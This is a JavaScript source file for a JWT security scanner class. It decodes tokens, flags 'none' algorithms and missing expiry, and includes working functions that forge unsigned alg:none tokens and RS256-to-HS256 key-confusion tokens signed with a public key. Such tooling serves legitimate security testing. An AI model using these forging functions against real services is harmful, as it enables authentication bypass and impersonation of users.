import crypto from 'node:crypto';

/**
 * JwtScanner - JSON Web Token Vulnerability Analysis Suite
 * Detects alg:none bypasses, RS256->HS256 key confusion, and weak signature secrets.
 */
export class JwtScanner {
  constructor() {
    this.weakSecrets = ['secret', '123456', 'jwtsecret', 'password', 'admin', 'key'];
  }

  /**
   * Decodes without verifying to extract header and payload
   */
  decode(token) {
    if (!token || typeof token !== 'string') return null;
    const parts = token.split('.');
    if (parts.length !== 3) return null;

    try {
      const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
      const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
      return { header, payload, signature: parts[2] };
    } catch {
      return null;
    }
  }

  /**
   * Generates an unsigned alg:none bypass variant of a JWT
   */
  forgeAlgNone(token) {
    const decoded = this.decode(token);
    if (!decoded) return null;

    const modifiedHeader = { ...decoded.header, alg: 'none' };
    const h64 = Buffer.from(JSON.stringify(modifiedHeader)).toString('base64url');
    const p64 = Buffer.from(JSON.stringify(decoded.payload)).toString('base64url');

    return `${h64}.${p64}.`;
  }

  /**
   * Generates RS256 -> HS256 Key Confusion attack token signed with the public key as HMAC secret
   */
  forgeKeyConfusion(token, publicKeyPem) {
    const decoded = this.decode(token);
    if (!decoded) return null;

    const modifiedHeader = { ...decoded.header, alg: 'HS256' };
    const h64 = Buffer.from(JSON.stringify(modifiedHeader)).toString('base64url');
    const p64 = Buffer.from(JSON.stringify(decoded.payload)).toString('base64url');
    const data = `${h64}.${p64}`;

    const signature = crypto.createHmac('sha256', publicKeyPem).update(data).digest('base64url');
    return `${data}.${signature}`;
  }

  /**
   * Scans a JWT token for security weaknesses
   */
  analyzeToken(token) {
    const decoded = this.decode(token);
    if (!decoded) {
      return { error: 'Invalid JWT format' };
    }

    const issues = [];
    if (decoded.header.alg === 'none' || decoded.header.alg === 'NONE') {
      issues.push({
        type: 'JWT_ALG_NONE_ACCEPTED',
        severity: 'CRITICAL',
        description: 'Token utilizes "none" algorithm which permits unverified signature forgery.'
      });
    }

    if (!decoded.payload.exp) {
      issues.push({
        type: 'JWT_MISSING_EXPIRATION',
        severity: 'MEDIUM',
        description: 'Token has no expiration ("exp") claim, leading to infinite replay viability.'
      });
    }

    return {
      decoded,
      issues,
      hasVulnerabilities: issues.length > 0
    };
  }
}
